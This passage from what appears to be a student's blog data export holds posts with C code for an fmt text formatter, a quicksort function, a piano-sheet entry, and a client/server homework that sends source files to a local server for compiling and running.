class=\"keyword\">void</span> <span class=\"title\">showhelp</span><span class=\"params\">()</span></span>&#123;<span class=\"comment\">// help info</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"\\nUsage: fmt [-WIDTH] [OPTION]... [FILE]...\\n\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Format each line in the FILE(s)\\n\\n\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"  -w, --width\\t\\tmaximum line width (default of 75)\\n\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"  -u, --uniform\\t\\tone space between words, two after sentences\\n\\n\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"      --help\\t\\toutput this help and exit\\n\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"      --version\\t\\toutput the version and exit\\n\\n\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Report myfmt bugs to sol315@lehigh.edu\\n\"</span>);</span><br><span class=\"line\">    return ;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">error</span><span class=\"params\">(<span class=\"keyword\">int</span> id,<span class=\"keyword\">int</span> msg, <span class=\"keyword\">char</span> *file)</span></span>&#123;<span class=\"comment\">//errors</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Error from fmt: \"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (id)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">\"Input file not found\\n\"</span>);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">\"Input file reading error in file \\\"%s\\\" line %d.\\n\"</span>,file,msg);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">3</span>:</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">\"The -w function requires the length of the line bigger than 0\\n\"</span>);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">4</span>:</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">\"Fmt requires input arguments\\n\"</span>);</span><br><span class=\"line\">            showhelp();</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return ;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span><br><span class=\"line\"> * this function is used to do the -w work</span><br><span class=\"line\"> * @param </span><br><span class=\"line\"> *          char *ret: the address of the string that needed to be changed</span><br><span class=\"line\"> *          int len: the length of that string</span><br><span class=\"line\"> * @return  the address of the changed string</span><br><span class=\"line\"> **/</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">char</span> *<span class=\"title\">runw</span><span class=\"params\">(<span class=\"keyword\">char</span> *ret,<span class=\"keyword\">int</span> len)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> buffer[FILE_LEN] = &#123;<span class=\"number\">0</span>&#125;;    </span><br><span class=\"line\">    <span class=\"keyword\">int</span> ret_len = <span class=\"number\">0</span>;<span class=\"comment\">//current length of the new string</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> jump = tasks.w_len;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"built_in\">strlen</span>(ret) == <span class=\"number\">1</span>) return ret;</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(buffer,ret);<span class=\"comment\">//when this function finished, the \"buffer\" space will gone. So we use buffer to</span></span><br><span class=\"line\">                       <span class=\"comment\">//store the original string, use \"ret\" to store the new string</span></span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(ret,<span class=\"number\">0</span>,FILE_LEN);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(jump &lt;= startblank) jump = startblank + <span class=\"number\">1</span>;<span class=\"comment\">//if the max width smaller than startblank, this line</span></span><br><span class=\"line\">                                                 <span class=\"comment\">//should place one word. We set jump=startblack+1 to do that</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> posi = jump - <span class=\"number\">1</span>,pre = startblank;<span class=\"comment\">//pre means the start position of the new line in the original string. posi means the current pointer position in original string</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span>(posi &lt; len)&#123;<span class=\"comment\">//this means the process hasn't finished</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span>(posi &gt; pre &amp;&amp; !isBlank(buffer[posi])) --posi;<span class=\"comment\">//if the max width cuts a word, get the start of the word.</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(posi == pre) <span class=\"keyword\">while</span>(!isBlank(buffer[posi])) ++posi;<span class=\"comment\">//if the first single word longer than the max width, get the end of the word.</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span>(isBlank(buffer[-- posi]));<span class=\"comment\">//if the position of the pointer is in blank, move backward and get the end of this line.</span></span><br><span class=\"line\">        posi ++;</span><br><span class=\"line\">\t\t<span class=\"built_in\">memset</span>(ret + ret_len, <span class=\"string\">' '</span>, startblank);<span class=\"comment\">//put some blanks in the start of the new line</span></span><br><span class=\"line\">\t\tret_len += startblank;<span class=\"comment\">//get the new length of the new string</span></span><br><span class=\"line\">\t\t<span class=\"built_in\">memcpy</span>(ret + ret_len, buffer + pre, posi - pre);<span class=\"comment\">//copy the line from the original string to the new one</span></span><br><span class=\"line\">\t\tret_len += posi - pre;</span><br><span class=\"line\">\t\tret[ret_len ++] = <span class=\"string\">'\\n'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(isBlank(buffer[posi])) ++posi;<span class=\"comment\">//skip the blanks and get the start of next line</span></span><br><span class=\"line\">        pre = posi;</span><br><span class=\"line\">        posi += jump - startblank - <span class=\"number\">1</span>;<span class=\"comment\">//jump to the next possible cut point</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(pre != len) &#123;<span class=\"comment\">//this part is used to handle the last line of the string</span></span><br><span class=\"line\">\t\tposi = len - <span class=\"number\">1</span>;<span class=\"comment\">//the position of the pointer is the end of the string</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span>(isBlank(buffer[posi])) --posi;<span class=\"comment\">//get the last no-blank char</span></span><br><span class=\"line\">\t\tposi ++;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(posi != pre) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">memset</span>(ret + ret_len, <span class=\"string\">' '</span>, startblank);</span><br><span class=\"line\">\t\t\tret_len += startblank;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">memcpy</span>(ret + ret_len, buffer + pre, posi - pre);</span><br><span class=\"line\">\t\t\tret_len += posi - pre;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">        ret[ret_len ++] = <span class=\"string\">'\\n'</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">    return ret;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">/**</span><br><span class=\"line\"> * this function is used to do the -u task</span><br><span class=\"line\"> * @param   buffer: the address of file </span><br><span class=\"line\"> *          len: the length of this file</span><br><span class=\"line\"> * @return  the address of the result string</span><br><span class=\"line\"> **/</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">char</span> *<span class=\"title\">runu</span><span class=\"params\">(<span class=\"keyword\">char</span>* ret,<span class=\"keyword\">int</span> len)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> buffer[FILE_LEN];</span><br><span class=\"line\">    <span class=\"keyword\">int</span> ret_len = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> flag = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(buffer,ret);</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(ret, <span class=\"number\">0</span>, FILE_LEN);<span class=\"comment\">//end of the string</span></span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(ret,<span class=\"string\">' '</span>,startblank);<span class=\"comment\">//put some blanks to the start of the new string</span></span><br><span class=\"line\">\tret_len = startblank;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>;i &lt; len;)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(isFinish(buffer[i])) flag = <span class=\"number\">1</span>;<span class=\"comment\">//if this char means the end of a sentence, set flag true</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!isBlank(buffer[i])) ret[ret_len ++] = buffer[i ++];<span class=\"comment\">//if it is a normal char, copy it </span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>&#123;<span class=\"comment\">//if it is a blank char</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span>(i) ret[ret_len ++] = <span class=\"string\">' '</span>;<span class=\"comment\">//if it isn't the start of the string, put a ' ' in it.</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span>(flag)&#123;</span><br><span class=\"line\">                ret[ret_len ++] = <span class=\"string\">' '</span>;<span class=\"comment\">//if it is the end of a sentence, put another blank in it.</span></span><br><span class=\"line\">                flag = <span class=\"number\">0</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">while</span>(isBlank(buffer[++ i]));<span class=\"comment\">//skip every blanks. using ++ i instead of i ++ can loop 1 time less</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return runw(ret,ret_len);<span class=\"comment\">//every -u needs a -w</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">getStartBlank</span><span class=\"params\">(<span class=\"keyword\">char</span> *buffer,<span class=\"keyword\">int</span> len)</span></span>&#123;<span class=\"comment\">//get the number of start blank</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>;i &lt; len;++ i)</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!isBlank(buffer[i])) </span><br><span class=\"line\">            return i;</span><br><span class=\"line\">    return <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">fmt</span><span class=\"params\">(<span class=\"keyword\">char</span> *filename)</span></span>&#123;</span><br><span class=\"line\">    FILE *fp;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> buffer[FILE_LEN] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *res;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> linenum = <span class=\"number\">0</span>;</span><br><span class=\"line\">    res = buffer;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> len;</span><br><span class=\"line\">    fp = fopen(filename,<span class=\"string\">\"r\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"literal\">NULL</span> == fp)&#123;</span><br><span class=\"line\">        error(<span class=\"number\">1</span>,<span class=\"number\">0</span>,<span class=\"literal\">NULL</span>);</span><br><span class=\"line\">        return <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(fgets(buffer,FILE_LEN - <span class=\"number\">2</span>,fp) != <span class=\"literal\">NULL</span>)&#123;<span class=\"comment\">//format the file line by line</span></span><br><span class=\"line\">        len = <span class=\"built_in\">strlen</span>(buffer);</span><br><span class=\"line\">        linenum ++;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(ferror(fp)) &#123;</span><br><span class=\"line\">            error(<span class=\"number\">2</span>,linenum,filename);</span><br><span class=\"line\">            return <span class=\"number\">-1</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        startblank = getStartBlank(buffer,len);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(tasks.u) res = runu(res,len);<span class=\"comment\">//if we do -u, the -w has been done so \"if else if\"</span></span><br><span class=\"line\">\t    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(tasks.w) res = runw(res,len);</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"%s\"</span>,res);</span><br><span class=\"line\">    &#125;   </span><br><span class=\"line\">    fclose(fp);</span><br><span class=\"line\">    return <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">showversion</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"version 25\\n\"</span>);</span><br><span class=\"line\">    return ;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">init</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    tasks.w = tasks.u = <span class=\"number\">0</span>;</span><br><span class=\"line\">    tasks.h = tasks.v = <span class=\"number\">0</span>;</span><br><span class=\"line\">    tasks.w_len = <span class=\"number\">75</span>;</span><br><span class=\"line\">    return ;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc,<span class=\"keyword\">char</span> **argv)</span></span>&#123;</span><br><span class=\"line\">    init();</span><br><span class=\"line\">    <span class=\"keyword\">int</span> option_index = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> opt = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> optstring[<span class=\"number\">4</span>] = <span class=\"string\">\"uw:\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">char</span>** infile;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> file_num = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>((opt = getopt_long(argc,argv,optstring,long_options,&amp;option_index)) != <span class=\"number\">-1</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">switch</span> (opt)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"string\">'u'</span>: </span><br><span class=\"line\">                tasks.u = <span class=\"number\">1</span>;</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"string\">'w'</span>:</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(optarg != <span class=\"literal\">NULL</span>) tasks.w_len = atoi(optarg);</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(tasks.w_len &lt;= <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">                    error(<span class=\"number\">3</span>,<span class=\"number\">0</span>,<span class=\"literal\">NULL</span>);</span><br><span class=\"line\">                    return <span class=\"number\">-1</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                tasks.w = <span class=\"number\">1</span>;</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"string\">'h'</span>:</span><br><span class=\"line\">                tasks.h = <span class=\"number\">1</span>;</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"string\">'v'</span>:</span><br><span class=\"line\">                tasks.v = <span class=\"number\">1</span>;</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(argc == <span class=\"number\">1</span>) error(<span class=\"number\">4</span>,<span class=\"number\">0</span>,<span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    infile = argv + optind;<span class=\"comment\">//get the name of input files</span></span><br><span class=\"line\">    file_num = argc - optind;<span class=\"comment\">//get the number of input files</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>;i &lt; file_num;++ i)&#123;</span><br><span class=\"line\">        fmt(infile[i]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(tasks.h) showhelp();</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(tasks.v) showversion();</span><br><span class=\"line\">    return <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"Piano sheet of Deborah's Theme","date":"2015-11-02T10:20:32.000Z","_content":"This is the piano sheet of a beautiful song\n<!--more-->\n![sheet 1](/image/20150420110404212.jpg)\n![sheet 2](/image/20150420110405685.jpg)\n\n","source":"_posts/PianosheetofDeborahsTheme.md","raw":"title: \"Piano sheet of Deborah's Theme\"\ndate: 2015-11-02 10:20:32\ntags: Piano sheet\n---\nThis is the piano sheet of a beautiful song\n<!--more-->\n![sheet 1](/image/20150420110404212.jpg)\n![sheet 2](/image/20150420110405685.jpg)\n\n","slug":"PianosheetofDeborahsTheme","published":1,"updated":"2016-06-08T20:21:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciph681uu0014wypdre9o7fqq","content":"<p>This is the piano sheet of a beautiful song<br><a id=\"more\"></a><br><img src=\"/image/20150420110404212.jpg\" alt=\"sheet 1\"><br><img src=\"/image/20150420110405685.jpg\" alt=\"sheet 2\"></p>\n","excerpt":"<p>This is the piano sheet of a beautiful song<br>","more":"<br><img src=\"/image/20150420110404212.jpg\" alt=\"sheet 1\"><br><img src=\"/image/20150420110405685.jpg\" alt=\"sheet 2\"></p>"},{"title":"Quicksort","date":"2015-10-17T14:16:04.000Z","_content":"I finished merge sort, heap sort. If I leave quicksort along, he must be very upset.\nSo... Quicksort, here we go.\nQuicksort, not only quick, but also ... quick.\nThe first quick means it runs quickly, the second one is it writes short and quick.\nHere is my code\n```\nvoid quicksort(int *line, int from, int to){\n    if(from == to) return ;\n    int pivot = line[to - 1],now = from;\n    for(int i = from;i < to - 1;++ i)\n        if(line[i] < pivot) swap(line[i],line[now ++]);\n    swap(line[now],line[to - 1]);\n    quicksort(line, from, now);\n    quicksort(line, now + 1, to);\n}\n\n```\n","source":"_posts/Quicksort.md","raw":"title: \"Quicksort\"\ndate: 2015-10-17 14:16:04\ntags: Algorithm\n---\nI finished merge sort, heap sort. If I leave quicksort along, he must be very upset.\nSo... Quicksort, here we go.\nQuicksort, not only quick, but also ... quick.\nThe first quick means it runs quickly, the second one is it writes short and quick.\nHere is my code\n```\nvoid quicksort(int *line, int from, int to){\n    if(from == to) return ;\n    int pivot = line[to - 1],now = from;\n    for(int i = from;i < to - 1;++ i)\n        if(line[i] < pivot) swap(line[i],line[now ++]);\n    swap(line[now],line[to - 1]);\n    quicksort(line, from, now);\n    quicksort(line, now + 1, to);\n}\n\n```\n","slug":"Quicksort","published":1,"updated":"2016-06-08T20:21:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciph681uv0017wypdh48iumuv","content":"<p>I finished merge sort, heap sort. If I leave quicksort along, he must be very upset.<br>So… Quicksort, here we go.<br>Quicksort, not only quick, but also … quick.<br>The first quick means it runs quickly, the second one is it writes short and quick.<br>Here is my code<br><figure class=\"highlight arduino\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">void</span> quicksort(<span class=\"keyword\">int</span> *<span class=\"built_in\">line</span>, <span class=\"keyword\">int</span> from, <span class=\"keyword\">int</span> to)&#123;</span><br><span class=\"line\">    <span class=\"built_in\">if</span>(from == to) <span class=\"built_in\">return</span> ;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> pivot = <span class=\"built_in\">line</span>[to - <span class=\"number\">1</span>],now = from;</span><br><span class=\"line\">    <span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> i = from;i &lt; to - <span class=\"number\">1</span>;++ i)</span><br><span class=\"line\">        <span class=\"built_in\">if</span>(<span class=\"built_in\">line</span>[i] &lt; pivot) swap(<span class=\"built_in\">line</span>[i],<span class=\"built_in\">line</span>[now ++]);</span><br><span class=\"line\">    swap(<span class=\"built_in\">line</span>[now],<span class=\"built_in\">line</span>[to - <span class=\"number\">1</span>]);</span><br><span class=\"line\">    quicksort(<span class=\"built_in\">line</span>, from, now);</span><br><span class=\"line\">    quicksort(<span class=\"built_in\">line</span>, now + <span class=\"number\">1</span>, to);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","excerpt":"","more":"<p>I finished merge sort, heap sort. If I leave quicksort along, he must be very upset.<br>So… Quicksort, here we go.<br>Quicksort, not only quick, but also … quick.<br>The first quick means it runs quickly, the second one is it writes short and quick.<br>Here is my code<br><figure class=\"highlight arduino\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">void</span> quicksort(<span class=\"keyword\">int</span> *<span class=\"built_in\">line</span>, <span class=\"keyword\">int</span> from, <span class=\"keyword\">int</span> to)&#123;</span><br><span class=\"line\">    <span class=\"built_in\">if</span>(from == to) <span class=\"built_in\">return</span> ;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> pivot = <span class=\"built_in\">line</span>[to - <span class=\"number\">1</span>],now = from;</span><br><span class=\"line\">    <span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> i = from;i &lt; to - <span class=\"number\">1</span>;++ i)</span><br><span class=\"line\">        <span class=\"built_in\">if</span>(<span class=\"built_in\">line</span>[i] &lt; pivot) swap(<span class=\"built_in\">line</span>[i],<span class=\"built_in\">line</span>[now ++]);</span><br><span class=\"line\">    swap(<span class=\"built_in\">line</span>[now],<span class=\"built_in\">line</span>[to - <span class=\"number\">1</span>]);</span><br><span class=\"line\">    quicksort(<span class=\"built_in\">line</span>, from, now);</span><br><span class=\"line\">    quicksort(<span class=\"built_in\">line</span>, now + <span class=\"number\">1</span>, to);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n"},{"title":"Simple Network","date":"2015-10-06T11:12:27.000Z","_content":"Author: Song Li\n[Download Project](/download/sol315_HW3.zip)\n##AIM##\nThis program is used to transform files from client to server, the server will run the received code and return the answer to the client. The client part and the server part are combined to a single program. Using \"fork()\" function to make them work separately.\n\n<!--more-->\n##USAGE##\nConfigure file:\nThe configure file is named \"config\". The first line of the file is the number of the files that needed to format. The name of each file should be put line by line right after the first line. At the end of the file, input the argument to the \"fmt\" function. Here is the\n###example###\n>2\nTest\nTest2\n-w 10 -u\n\n###Arguments###\nThe IP address and the port number will be the arguments. Users can just input\nthe IP address and the port number just follow the \"./combine\". Here is an example:\n>./combine 127.0.0.1 9876\n\n##COMPILE##\nType \"make\" to compile the source code.\n##FILE STRUCTURE##\n>fmt.c: the main code of this fmt.c\ncombine.c: the code of this program\nmakefile: the makefile document to compile the code\ntest: the first test file\ntest2: the second test file\nconfig: the config file used by the program\nReadme.pdf: this readme document\n\n##RESULT##\nThis program will have two processes, the files will be read from the client part and be sent to the server part. The server part will then receive these files, store them to the \"./s_temp\" folder, compile the fmt.c code, run it and return the answer to the client part.\n\n##DESIGN##\n1) Connection refused: Since the server and client runs separately, when the client tries to connect the server, the server may not initiated yet. Every time when the client fails to connect the server, it will try to reconnect 3 seconds later again. If the client tries to reconnect 3 times and still not connected, it will give up and exit.\n2) Avoid the same file name: As the client and the server are indeed one program, they work in a same directory. In order to avoid the change to this directory, all of the server's work will be done in the \"./s_temp/\" directory. Files received will be storied in \"./s_temp/\", and they will be compiled there, they will run there, and they will get the answer there. \n\nhere is the code:\n\n```\n#include <stdio.h>\n#include <string.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <string.h>\n#define BUFFER_SIZE 500\n#define A_LEN 5\n#define FILE_NUM 2// the number of the codes and makefile\nint filenum = 0;//the total number of files\nchar files[100][100] = {\"fmt.c\", \"makefile\"};//files that should be transed\nint errorout(int id){//error output function\n    if(id > 0) \n        perror(\"ERROR FROM CLIENT\");\n    else perror(\"ERROR FROM SERVER\");\n    switch (id){\n        case 1:\n            printf(\"Client socket initiate error\\n\");\n            break;\n        case 2:\n            printf(\"Client connect failed\\n\");\n            break;\n        case 3:\n            printf(\"File open error\\n\");\n            break;\n        case 4:\n            printf(\"Config file is needed\\n\");\n            break;\n        case -1:\n            printf(\"Server socket initiate error\\n\");\n            break;\n        case -2:\n            printf(\"Server bind error\\n\");\n            break;\n        case -3:\n            printf(\"Client connect failed\\n\");\n            break;\n    }\n    return 0;\n}\n/**\n * this function is used to output message\n * @param \n *      server: 0 for client, 1 for server\n *      msg: the message itself\n **/\nint outputmsg(int server, char *msg){\n    if(server) printf(\"SERVER: \");\n    else printf(\"CLIENT: \");\n    printf(\"%s\",msg);\n    return 0;\n}\n\n/**\n * this function is used to send message\n * @param\n *      c_sock: the socket which the message will send to\n *      msg: the message\n **/\nint sendmessage(int c_sock, char *msg){\n    char buffer[BUFFER_SIZE] = {0};\n    strcpy(buffer, msg);\n    send(c_sock, buffer, BUFFER_SIZE - 2,0);\n    return 0;\n}\n\n/**\n * this function is used to send files\n * @param\n *      c_sock: the socket which the message will send to\n *      filename: the file name of the file that is needed to be sent\n **/\nint sendfile(int c_sock, char *filename){\n    char buffer[BUFFER_SIZE] = {0};\n    FILE *fp = fopen(filename, \"r\");\n    if(NULL == fp){\n        errorout(3);\n        printf(\"%s isn\\'t exist\\n\",filename);\n        return -1;\n    }\n    while(fgets(buffer, BUFFER_SIZE - 2, fp) != NULL){//get the file line by line and send it\n        printf(\"%s\",buffer);\n        send(c_sock, buffer, BUFFER_SIZE - 2, 0);\n    }\n    return 0;\n}\n\n/**\n * the main function of client part\n * @param\n *      args: the arguments that should be sent to the server\n *      addr: the address information of client\n **/\nint client(char * args, struct sockaddr_in addr){\n    int sock,i;\n    int len;\n    char buffer[BUFFER_SIZE];\n    sock = socket(PF_INET, SOCK_STREAM, 0);//use ipv4/tcp/ip to transform\n    if(sock < 0){//fail to initiate the socket\n        errorout(1);\n        return -1;\n    }\n    for(i = 0;i < 3;++ i){//if the client tries to connect the server failed, try three times in total\n        if(connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr)) < 0){\n            errorout(2);\n            if(i == 2) {// three times later, the client part will exit\n                errorout(2);\n                return -2;\n            }\n            //try to connect to the server 3 seconds later\n            outputmsg(0,\"Try to reconnect 3 seconds later\\n\");\n            sleep(1);\n            outputmsg(0,\"Try to reconnect 2 seconds later\\n\");\n            sleep(1);\n            outputmsg(0,\"Try to reconnect 1 second later\\n\");\n            sleep(1);\n        }\n        else break;\n    }\n    outputmsg(0,\"Connected to the server\\n\");\n    printf(\"__START__TRANSMISSION\\n__START__FILELIST\\n\");//output the names of files\n    for(i = 0;i < FILE_NUM;++ i) printf(\"%s\\n\",files[i]);\n    sendmessage(sock, \"__START__\");//send the file list (config) to the server\n    sendmessage(sock,\"config\");\n    sendfile(sock, \"config\");\n    sendmessage(sock, \"__END__\");\n    printf(\"__END__FILELIST\\n\");\n    for(i = 0;i < FILE_NUM;++ i){//output the names and send messages and files to server        sendmessage(sock, \"__START__\");//if the cil\n        sendmessage(sock, \"__START__\");//if the client sends the \"__START__\" message, it means there will be a new file to send\n        sendmessage(sock, files[i]);//send the name of the file\n        printf(\"__START__%s\\n\",files[i]);\n        sendfile(sock, files[i]);//send this file\n        sendmessage(sock, \"__END__\");//if the client sends the \"__END__\", means it's the end of a file\n        printf(\"__END__%s\\n\",files[i]);\n    }\n    printf(\"__START__ARGs\\n\");\n    sendmessage(sock,\"__ARGs__\");//if the client sends the \"__ARGs__\", means the next message will be the atgs\n    sendmessage(sock,args);\n    printf(\"%s\\n\",args);\n    printf(\"__END__ARGs\\n\");\n    for(i = FILE_NUM;i < filenum;++ i){//send the files which are needed to format\n        sendmessage(sock, \"__START__\");\n        sendmessage(sock, files[i]);\n        printf(\"__START__%s_TO_FORMAT\\n\",files[i]);\n        sendfile(sock, files[i]);\n        sendmessage(sock, \"__END__\");\n        printf(\"__END__%s_TO_FORMAT\\n\",files[i]);\n    }\n    sendmessage(sock,\"__TRANS END__\");\n    printf(\"__END__TRANSMISSION\\n\");\n    int flag = 0;\n    while((len = recv(sock, buffer, BUFFER_SIZE - 2, 0)) > 0){//recv the answer from server\n        if(!flag) printf(\"__START__RESULT\\n\");//before the first line of answer, print this. in order to avoid the other process distroy the output, this message should be printed after it recvs the answer\n        flag = 1;\n        buffer[len] = 0;\n        printf(\"%s\",buffer);\n    } \n    printf(\"__END__RESULT\\n\");\n    close(sock);\n    return 0;\n}\n\n\n/**\n * this function is the main function of server part\n * @param addr: the address of the server\n *\n * in order to avoid the same file name with the original filename,\n * the server part will work in the ./s_temp/ folder\n * the files recieved by the server will be stored in this folder\n * and the answer will also be generated there\n **/\nint server(struct 